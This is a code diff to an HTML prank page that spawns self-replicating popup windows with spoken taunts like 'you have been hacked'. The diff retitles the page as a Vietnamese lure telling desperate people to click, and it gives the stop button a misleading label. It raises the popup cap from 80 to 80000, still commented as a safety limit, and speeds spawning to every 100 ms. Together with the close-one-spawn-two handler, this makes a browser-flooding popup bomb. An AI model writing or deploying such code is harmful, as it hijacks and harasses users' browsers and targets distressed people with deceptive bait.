@@ -2,22 +2,22 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>DIMENSION GOD FAST</title>
+<title>nếu bạn đang tuyệt vọng thì bấm vào đây</title>
 </head>
 <body style="background:black;color:red;font-family:Arial;text-align:center">
 
 <h1>👁 DIMENSION GOD — FAST SPAWN</h1>
-<button onclick="start()">🔥 START</button>
-<button onclick="stop()">🛑 STOP</button>
+<button onclick="start()">here</button>
+<button onclick="stop()">ko có gì hết STOP</button>
 
 <script>
 let popups=[];
 let running=false;
 let stopped=false;
-const MAX_POPUPS=80;     // giới hạn an toàn
+const MAX_POPUPS=80000;     // giới hạn an toàn
 
 function robotSpeak(){
-  const words=["ai hỏi","gar dayum","lol","error404","you have been hacked"];
+  const words=["ai hỏi","gar dayum","lol","error404","you have been hacked","cay không"];
   let msg=new SpeechSynthesisUtterance(
     words[Math.floor(Math.random()*words.length)]
   );
@@ -38,7 +38,7 @@ function createPopup(x,y){
     <h3 id="t">ai hỏi</h3>
 
     <script>
-      const words=["ai hỏi","gar dayum","lol","error404","you have been hacked"];
+      const words=["ai hỏi","gar dayum","lol","error404","you have been hacked","cay không"];
 
       // đổi chữ nhanh
       setInterval(()=>{
@@ -57,7 +57,7 @@ function createPopup(x,y){
         if(window.opener && !window.opener.stopped){
           window.opener.spawnChild();
         }
-      },1500);
+      },100);
 
       // 💀 đóng 1 sinh 2 (demo safe)
       window.onbeforeunload=function(){
@@ -101,3 +101,4 @@ function stop(){
 
 </body>
 </html>
+
